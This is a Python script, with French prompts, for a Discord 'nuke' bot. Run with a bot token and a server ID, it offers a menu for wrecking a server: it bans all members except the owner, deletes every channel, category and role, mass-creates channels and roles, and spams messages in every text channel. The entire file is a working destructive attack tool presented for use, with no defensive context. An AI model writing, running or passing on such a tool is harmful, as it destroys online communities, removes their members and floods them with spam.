import discord
import asyncio
import os

intents = discord.Intents.all()
client = discord.Client(intents=intents)

guild_id_global = None

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

async def del_all_servers():
    guild = client.get_guild(guild_id_global)
    if not guild:
        print("Serveur introuvable")
        return
    
    me = guild.me  
    owner = guild.owner  

    print("Début du bannissement des membres...")
    for member in guild.members:
        if member.id in (me.id, owner.id):
            continue
        try:
            await member.ban(reason="Nuked by bot")
            print(f"Banni {member}")
        except Exception as e:
            print(f"Impossible de bannir {member}: {e}")

    print("Suppression des catégories et salons...")
    for category in guild.categories:
        try:
            await category.delete()
            print(f"Supprimé catégorie : {category.name}")
        except Exception as e:
            print(f"Erreur suppression catégorie {category.name} : {e}")

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Supprimé salon : {channel.name}")
        except Exception as e:
            print(f"Erreur suppression salon {channel.name} : {e}")

    print("Suppression des rôles...")
    for role in guild.roles:
        if role.is_default():
            continue
        try:
            await role.delete()
            print(f"Supprimé rôle : {role.name}")
        except Exception as e:
            print(f"Erreur suppression rôle {role.name} : {e}")

    try:
        await guild.edit(banner=None)
        print("Bannière supprimée.")
    except Exception as e:
        print(f"Erreur suppression bannière : {e}")

    print("Nuke complet terminé.")

async def nuke_server():
    guild = client.get_guild(guild_id_global)
    if not guild:
        print("Serveur introuvable")
        return

    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"Supprimé channel : {channel.name}")
        except Exception as e:
            print(f"Erreur suppression channel {channel.name} : {e}")

    try:
        count_channels = int(input("Combien de salons veux-tu créer ? "))
        name_channel = input("Nom des salons à créer : ").strip()
    except ValueError:
        print("Entrée invalide.")
        return

    new_channels = []
    for i in range(count_channels):
        try:
            ch = await guild.create_text_channel(f"{name_channel}")
            new_channels.append(ch)
            print(f"Salon créé : {ch.name}")
        except Exception as e:
            print(f"Erreur création salon {name_channel} : {e}")

    try:
        count_roles = int(input("Combien de rôles veux-tu créer ? "))
        name_role = input("Nom des rôles à créer : ").strip()
    except ValueError:
        print("Entrée invalide.")
        return

    for i in range(count_roles):
        try:
            role = await guild.create_role(name=f"{name_role}")
            print(f"Rôle créé : {role.name}")
        except Exception as e:
            print(f"Erreur création rôle : {e}")

    message = input("Quel message veux-tu envoyer dans chaque salon ? ").strip()
    for ch in new_channels:
        try:
            await ch.send(message)
            print(f"Message envoyé dans {ch.name}")
        except Exception as e:
            print(f"Erreur envoi message dans {ch.name} : {e}")


async def delete_roles():
    guild = client.get_guild(guild_id_global)
    if not guild:
        print("Serveur introuvable")
        return

    roles = [role for role in guild.roles if not role.is_default()]
    if not roles:
        print("Aucun rôle à supprimer.")
        return

    for role in roles:
        try:
            await role.delete(reason="Nuked par bot")
            print(f"Supprimé rôle : {role.name}")
        except Exception as e:
            print(f"Erreur suppression rôle {role.name} : {e}")

async def spam_message():
    guild = client.get_guild(guild_id_global)
    if not guild:
        print("Serveur introuvable")
        return
    msg = input("Message à spammer dans tous les salons : ")

    while True:
        count_input = input("Nombre de fois par salon : ").strip()
        try:
            count = int(count_input)
            if count < 1:
                print("Veuillez entrer un nombre entier positif.")
                continue
            break
        except ValueError:
            print("Entrée invalide, veuillez entrer un nombre entier.")

    text_channels = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]
    print(f"{len(text_channels)} salons texte trouvés.")

    async def spam_in_channel(channel):
        for _ in range(count):
            try:
                await channel.send(msg)
                print(f"Message envoyé dans {channel.name}")
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"Erreur envoi message dans {channel.name} : {e}")
                break

    tasks = [asyncio.create_task(spam_in_channel(ch)) for ch in text_channels]
    await asyncio.gather(*tasks)

async def mass_role():
    guild = client.get_guild(guild_id_global)
    if not guild:
        print("Serveur introuvable")
        return

    role_name = input("Nom du rôle à créer : ").strip()
    if not role_name:
        print("Nom du rôle vide, annulation.")
        return

    while True:
        count_input = input("Nombre de rôles à créer : ").strip()
        try:
            count = int(count_input)
            if count < 1:
                print("Veuillez entrer un nombre entier positif.")
                continue
            break
        except ValueError:
            print("Entrée invalide, veuillez entrer un nombre entier.")

    for i in range(count):
        try:
            await guild.create_role(name=f"{role_name}")
            print(f"Rôle {role_name} créé")
        except Exception as e:
            print(f"Erreur création rôle : {e}")
            break


async def menu_loop():
    while True:
        clear()
        print("""
╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                          MENU Nuke                                              ║
╠═════════════════╗════════════╗═══════════════════════════════════════════╔═══════╗══════════════╣
║ TOOL-Track      ║ NAME       ║                   X-VDP-X                 ║ Mail  ║   Number     ║
╠═════════════════╝════════════╝═══════════════════════════════════════════╚═══════╝══════════════╣
║ Page N°1                                                                                        ║
║ [1]. delete all server               [3].delete role               [5].Mass role                ║
║ [2]. nuke server                     [4].spam message              [6].bye                      ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════╝
""")
        choix = input("Choix > ").strip()
        if choix == '1':
            await del_all_servers()
        elif choix == '2':
            await nuke_server()
        elif choix == '3':
            await delete_roles()
        elif choix == '4':
            await spam_message()
        elif choix == '5':
            await mass_role()
        elif choix == '6':
            print("Bye !")
            await client.close()
            break
        else:
            print("Choix invalide")

        await asyncio.sleep(2)  

@client.event
async def on_ready():
    print(f"Connecté en tant que {client.user} (ID : {client.user.id})")
    await menu_loop()

if __name__ == "__main__":
    clear()
    token = input("Token du bot : ").strip()
    while True:
        gid_input = input("ID du serveur (guild) : ").strip()
        try:
            guild_id_global = int(gid_input)
            break
        except ValueError:
            print("Entrée invalide, veuillez entrer un nombre entier.")

    clear()
    client.run(token)
